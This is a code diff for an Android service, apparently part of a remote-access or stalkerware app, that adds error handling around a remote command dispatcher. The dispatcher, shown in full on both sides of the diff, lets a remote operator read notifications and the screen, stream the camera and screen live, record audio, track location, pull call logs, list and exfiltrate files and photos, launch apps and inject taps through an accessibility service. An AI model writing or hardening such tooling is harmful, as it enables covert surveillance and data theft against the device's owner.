@@ -127,52 +127,57 @@ class FirebaseCommandService : Service() {
         Log.d("FirebaseService", "Received command: $command")
         val currentSessionKey = sessionKey ?: return
 
-        when (command) {
-            "READ_NOTIFICATIONS" -> readNotifications()
-            "READ_SCREEN" -> readScreen()
-            "START_LIVE_SCREEN" -> startLiveScreen()
-            "STOP_LIVE_SCREEN" -> stopLiveScreen()
-            "START_RECORD_AUDIO" -> {
-                AudioRecordManager.startRecording(this, currentSessionKey)
-            }
-            "STOP_RECORD_AUDIO" -> {
-                AudioRecordManager.stopRecording(currentSessionKey)
-            }
-            "GET_LOCATION" -> getLocation()
-            "GET_INSTALLED_APPS" -> getInstalledApps()
-            "GET_DEVICE_STATS" -> getDeviceStats()
-            "GET_RECENT_CALLS" -> getRecentCalls()
-            "PLAY_ALARM" -> playRemoteAlarm()
-            "GET_APP_USAGE" -> getAppUsageStats()
-            "CAPTURE_PHOTO" -> capturePhoto()
-            "GET_DEVICE_INFO" -> getDetailedDeviceInfo()
-            "START_LIVE_CAMERA:FRONT" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, true) }
-            "START_LIVE_CAMERA:BACK" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, false) }
-            "STOP_LIVE_CAMERA" -> com.jonas.x24.CameraStreamManager.stopStreaming()
-            else -> {
-                if (command.startsWith("DISPATCH_GESTURE:CLICK:")) {
-                    val coords = command.removePrefix("DISPATCH_GESTURE:CLICK:").split(":")
-                    if (coords.size == 2) {
-                        val xPercent = coords[0].toFloatOrNull()
-                        val yPercent = coords[1].toFloatOrNull()
-                        if (xPercent != null && yPercent != null) {
-                            com.jonas.x24.services.x24AccessibilityService.instance?.clickPercentage(xPercent, yPercent)
+        try {
+            when (command) {
+                "READ_NOTIFICATIONS" -> readNotifications()
+                "READ_SCREEN" -> readScreen()
+                "START_LIVE_SCREEN" -> startLiveScreen()
+                "STOP_LIVE_SCREEN" -> stopLiveScreen()
+                "START_RECORD_AUDIO" -> {
+                    AudioRecordManager.startRecording(this, currentSessionKey)
+                }
+                "STOP_RECORD_AUDIO" -> {
+                    AudioRecordManager.stopRecording(currentSessionKey)
+                }
+                "GET_LOCATION" -> getLocation()
+                "GET_INSTALLED_APPS" -> getInstalledApps()
+                "GET_DEVICE_STATS" -> getDeviceStats()
+                "GET_RECENT_CALLS" -> getRecentCalls()
+                "PLAY_ALARM" -> playRemoteAlarm()
+                "GET_APP_USAGE" -> getAppUsageStats()
+                "CAPTURE_PHOTO" -> capturePhoto()
+                "GET_DEVICE_INFO" -> getDetailedDeviceInfo()
+                "START_LIVE_CAMERA:FRONT" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, true) }
+                "START_LIVE_CAMERA:BACK" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, false) }
+                "STOP_LIVE_CAMERA" -> com.jonas.x24.CameraStreamManager.stopStreaming()
+                else -> {
+                    if (command.startsWith("DISPATCH_GESTURE:CLICK:")) {
+                        val coords = command.removePrefix("DISPATCH_GESTURE:CLICK:").split(":")
+                        if (coords.size == 2) {
+                            val xPercent = coords[0].toFloatOrNull()
+                            val yPercent = coords[1].toFloatOrNull()
+                            if (xPercent != null && yPercent != null) {
+                                com.jonas.x24.services.x24AccessibilityService.instance?.clickPercentage(xPercent, yPercent)
+                            }
                         }
+                    } else if (command.startsWith("LAUNCH_APP:")) {
+                        val pkgName = command.removePrefix("LAUNCH_APP:").trim()
+                        launchApp(pkgName)
+                    } else if (command.startsWith("LIST_FILES:")) {
+                        val path = command.removePrefix("LIST_FILES:").trim()
+                        listFiles(path)
+                    } else if (command.startsWith("FETCH_PIC:")) {
+                        val path = command.removePrefix("FETCH_PIC:").trim()
+                        fetchPic(path)
+                    } else if (command.startsWith("FETCH_FILE:")) {
+                        val path = command.removePrefix("FETCH_FILE:").trim()
+                        fetchFile(path)
                     }
-                } else if (command.startsWith("LAUNCH_APP:")) {
-                    val pkgName = command.removePrefix("LAUNCH_APP:").trim()
-                    launchApp(pkgName)
-                } else if (command.startsWith("LIST_FILES:")) {
-                    val path = command.removePrefix("LIST_FILES:").trim()
-                    listFiles(path)
-                } else if (command.startsWith("FETCH_PIC:")) {
-                    val path = command.removePrefix("FETCH_PIC:").trim()
-                    fetchPic(path)
-                } else if (command.startsWith("FETCH_FILE:")) {
-                    val path = command.removePrefix("FETCH_FILE:").trim()
-                    fetchFile(path)
                 }
             }
+        } catch (e: Exception) {
+            Log.e("FirebaseService", "Command crashed: ${e.message}", e)
+            postResult("ERROR", "Command crashed: ${e.message}", command)
         }
     }
 
